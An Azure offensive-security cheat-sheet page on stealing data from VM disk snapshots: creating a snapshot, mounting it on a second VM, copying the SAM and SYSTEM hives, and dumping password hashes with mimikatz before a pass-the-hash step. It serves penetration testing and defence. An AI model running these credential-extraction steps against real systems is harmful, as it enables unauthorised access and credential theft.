# VHD Analysis

## VHD Analysis

VHD = virtual disk

From a VHD snapshot or backup, it's possible to remount it and steal data.

**Depends on Permissions** 

| Role | Actions |
| :--- | :--- |
| Reader | Can't execute command or download VHD |
| Contributor | Can run commands and create Snapshots |
| Owner | Can run commands and create Snapshots |
| Service Accounts | Can sometimes access to VHDs |

### Create a VM snapshot

From the Azure portal, locate the VM, select the Virtual Disk and create a snapshot

![](../../../../../.gitbook/assets/image%20%28261%29.png)

![](../../../../../.gitbook/assets/image%20%28287%29.png)

![](../../../../../.gitbook/assets/image%20%28277%29.png)

Since the size can be really big, the best way to analyze it is to create an another VM and mount the snapshot from there :

![](../../../../../.gitbook/assets/image%20%28158%29.png)

* Add the snapshot as a Disk on the analysis VM :

![](../../../../../.gitbook/assets/image%20%28128%29.png)

* Save 

![](../../../../../.gitbook/assets/image%20%2843%29%20%281%29.png)

* On the second VM, disk have been added

![](../../../../../.gitbook/assets/image%20%28283%29.png)

### Mount the Disk

![](../../../../../.gitbook/assets/image%20%28210%29.png)

### Copy SAM and SYSTEM files

![](../../../../../.gitbook/assets/image%20%28220%29.png)

### Upload the file on the windows VM

```csharp
 Get-SCPFolder -ComputerName "REMOTE_TARGET" -RemoteFolder "/root/pwn" -LocalFolder "C:\Users\b3v1l\Desktop\tools\mimikatz_trunk\x64\sam" -Credential $creds
```

### Extract Hashes using mimikatz

```csharp
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::SAM /SAM:C:\Users\b3v1l\Desktop\tools\mimikatz_trunk\x64\sam\SAM /SYSTEM:C:\Users\b3v1l\Desktop\tools\mimikatz_trunk\x64\sam\SYSTEM
```

![](../../../../../.gitbook/assets/image%20%28304%29.png)

### Pass The Hash

...

### Resources

{% embed url="https://github.com/darkoperator/Posh-SSH" %}



{% embed url="https://github.com/gentilkiwi/mimikatz" %}







